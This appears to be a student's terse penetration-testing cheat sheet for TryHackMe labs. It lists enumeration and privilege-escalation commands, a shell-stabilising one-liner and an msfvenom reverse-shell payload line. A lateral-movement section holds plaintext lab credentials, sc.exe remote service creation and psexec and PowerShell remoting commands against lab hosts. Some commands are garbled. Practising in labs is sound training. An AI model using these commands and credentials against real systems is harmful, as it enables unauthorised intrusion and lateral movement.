# Basic Steps

[Tyler's Notebook](https://southeasttech-my.sharepoint.com/:o:/g/personal/tyler_ramsbey_southeasttech_edu/EmrNEjx_FjRKjYRotc9TikMB7DtzCwhKWOAEovdtZADBgg?rtime=bQkHVxRr20g)

## Automatic web enum
- dirb | dirsearch
- linpeas
- wpsscan -U user -P password

## Basic network
- nmap (all ports)
  - script: locate -r nse$ | grep NAME
- nmap Scrips
  - locate -r nse$ | grep mysql = nmap script

## Linux
- sudo -l
- find / -perm -u=s -type f 2>/dev/null
- find / -type f -perm -04000 -ls 2>/dev/null 
- psexec.py
- lscpu
- lsblk -a
- lsusb -v
- lspci -t -v
- fidlist -l
  
- Shell stabilize
  -  python3 -c 'import pty;pty.spawn("/bin/bash")'
  - python3 -c  import pty;pty.spawn('/bin/bash') 
  - export TERM=xterm

## Payloads
- msfvenom - reverse -f aspx -o app.aspx

## Windows
- /priv
- systeminfo
- smb read/write
- browser cache
- scheduled task
- UAC
- Check loggings
  - sysmon enable / powershell loggging enabled ?
- echo %VARIABLE%


# Lateral Movement
arthur.campbell:Pksp9395

$ ssh za.tryhackme.com\\arthur.campbell:@thmjmp2.za.tryhackme.com


sc.exe \\thmiis.za.tryhackme.com create THMservice-3244 binPath= "%windir%\pat.exe" start=auto
THM{MOVING_WITH_SERVICES}

\\thmiis.za.tryhackme.com 

psexec64.exe \\thmiis.za.tryhackme.com -u ZA.TRYHACKME.COM\t1_leonard.summers -p EZpass4ever -i %windir%\pat.exe

psexec64.exe \\thmiis.za.tryhackme.com -u t1_leonard.summers -i %windir%\pat.exe

===
$username = 'ZA.TRYHACKME.COM\t1_leonard.summers';
$password = 'EZpass4ever';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;

Enter-PSSession -Computername \\thmiis.za.tryhackme.com -Credential $credentialwho
